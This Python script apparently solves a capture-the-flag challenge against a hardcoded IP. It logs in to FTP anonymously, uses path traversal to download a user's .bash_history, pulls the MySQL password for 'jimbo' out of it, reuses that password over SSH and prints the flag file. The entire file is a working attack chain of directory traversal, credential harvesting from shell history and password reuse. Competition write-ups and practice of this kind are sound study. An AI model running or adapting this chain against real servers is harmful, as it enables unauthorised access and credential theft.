#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "paramiko>=3.4.0",
# ]
# ///

from __future__ import annotations

import ftplib
import pathlib
import re
import sys

import paramiko

HERE = pathlib.Path(__file__).resolve().parent

HOST = "23.179.17.69"
FTP_PORT = 10921
SSH_PORT = 22

PASSWORD_RE = re.compile(r"mysql -u jimbo -p([A-Za-z0-9]+)")
FLAG_RE = re.compile(r"^CIT\{[A-Za-z0-9_$@!+\-]{4,80}\}$")


class HostPasvFTP(ftplib.FTP):
    def makepasv(self) -> tuple[str, int]:
        _, port = super().makepasv()
        host = self.sock.getpeername()[0]
        return host, port


def ftp_fetch(path: str) -> bytes:
    ftp = HostPasvFTP()
    ftp.connect(HOST, FTP_PORT, timeout=15)
    ftp.login("anonymous", "anonymous@")
    chunks: list[bytes] = []
    ftp.retrbinary(f"RETR {path}", chunks.append)
    ftp.quit()
    return b"".join(chunks)


def extract_jimbo_password(history_text: str) -> str:
    match = PASSWORD_RE.search(history_text)
    if not match:
        raise RuntimeError("failed to recover jimbo password from .bash_history")
    return match.group(1)


def ssh_fetch_flag(password: str) -> str:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        HOST,
        port=SSH_PORT,
        username="jimbo",
        password=password,
        look_for_keys=False,
        allow_agent=False,
        timeout=20,
        banner_timeout=20,
        auth_timeout=20,
    )
    try:
        _, stdout, stderr = client.exec_command("cat /home/jimbo/flag2.txt", timeout=20)
        status = stdout.channel.recv_exit_status()
        out = stdout.read().decode("utf-8", "replace").strip()
        err = stderr.read().decode("utf-8", "replace").strip()
        if status != 0:
            raise RuntimeError(f"failed to read /home/jimbo/flag2.txt: {err}")
        if not FLAG_RE.match(out):
            raise RuntimeError(f"unexpected flag output: {out!r}")
        return out
    finally:
        client.close()


def main() -> None:
    history = ftp_fetch("../../home/jimbo/.bash_history").decode("utf-8", "replace")
    password = extract_jimbo_password(history)
    flag = ssh_fetch_flag(password)
    print(flag)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise
